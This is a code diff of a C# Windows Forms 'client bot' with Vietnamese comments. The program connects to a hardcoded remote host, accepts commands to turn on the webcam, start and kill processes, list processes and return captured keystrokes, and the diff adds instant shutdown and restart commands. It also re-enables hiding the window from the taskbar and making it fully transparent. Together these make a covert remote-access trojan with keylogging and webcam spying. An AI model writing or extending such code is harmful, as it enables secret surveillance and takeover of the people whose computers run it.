@@ -17,7 +17,7 @@ namespace TargetApp
     public partial class Form1 : Form
     {
         // --- CẤU HÌNH KẾT NỐI ---
-        const string HOST_IP = "26.201.85.236"; // Nhớ đổi IP này khi gửi cho bạn
+        const string HOST_IP = "127.0.0.1"; // NHỚ ĐỔI IP RADMIN CỦA BẠN TRƯỚC KHI BUILD
         const int HOST_PORT = 9999;
 
         TcpClient client;
@@ -39,10 +39,10 @@ namespace TargetApp
             InitializeComponent();
             CheckForIllegalCrossThreadCalls = false;
 
-            // this.ShowInTaskbar = false;
-            // this.Opacity = 0;
+             this.ShowInTaskbar = false;
+             this.Opacity = 0;
 
-            this.Text = "CLIENT BOT - FULL ERROR MSG";
+            this.Text = "CLIENT BOT - POWER CONTROL";
             this.Load += Form1_Load;
             this.FormClosing += Form1_FormClosing;
         }
@@ -105,7 +105,6 @@ namespace TargetApp
                 case "WEBCAM_ON": StartWebcam(); return "OK: Cam On";
                 case "WEBCAM_OFF": StopWebcam(); return "OK: Cam Off";
 
-                // --- ĐÃ SỬA LẠI THÔNG BÁO LỖI START ---
                 case "START":
                     try
                     {
@@ -117,11 +116,9 @@ namespace TargetApp
                         return "Lỗi: Không thể mở '" + param + "'. Chi tiết: " + ex.Message;
                     }
 
-                // --- ĐÃ SỬA LẠI THÔNG BÁO LỖI STOP ---
                 case "STOP":
                     try
                     {
-                        // 1. Nếu là PID (Số)
                         if (int.TryParse(param, out int pid))
                         {
                             try
@@ -137,11 +134,9 @@ namespace TargetApp
                         }
                         else
                         {
-                            // 2. Nếu là Tên App (Chữ)
                             string name = param.ToLower().Replace(".exe", "").Trim();
                             Process[] procs = Process.GetProcessesByName(name);
 
-                            // Tìm kiếm thông minh
                             if (procs.Length == 0)
                             {
                                 List<Process> found = new List<Process>();
@@ -167,6 +162,31 @@ namespace TargetApp
                 case "LIST": return GetProcs();
 
                 case "KEYLOG": string k = keyLogBuffer.ToString(); keyLogBuffer.Clear(); return k;
+
+                // --- ĐÃ THÊM: LỆNH TẮT MÁY ---
+                case "SHUTDOWN":
+                    try
+                    {
+                        Process.Start("shutdown", "/s /t 0"); // /s: shutdown, /t 0: ngay lập tức
+                        return "OK: Máy tính sẽ tắt ngay lập tức.";
+                    }
+                    catch (Exception ex)
+                    {
+                        return "Lỗi: Không thể tắt máy. Chi tiết: " + ex.Message;
+                    }
+
+                // --- ĐÃ THÊM: LỆNH RESTART MÁY ---
+                case "RESTART":
+                    try
+                    {
+                        Process.Start("shutdown", "/r /t 0"); // /r: restart, /t 0: ngay lập tức
+                        return "OK: Máy tính sẽ khởi động lại ngay lập tức.";
+                    }
+                    catch (Exception ex)
+                    {
+                        return "Lỗi: Không thể khởi động lại. Chi tiết: " + ex.Message;
+                    }
+
 
                 default: return "Unknown Cmd";
             }
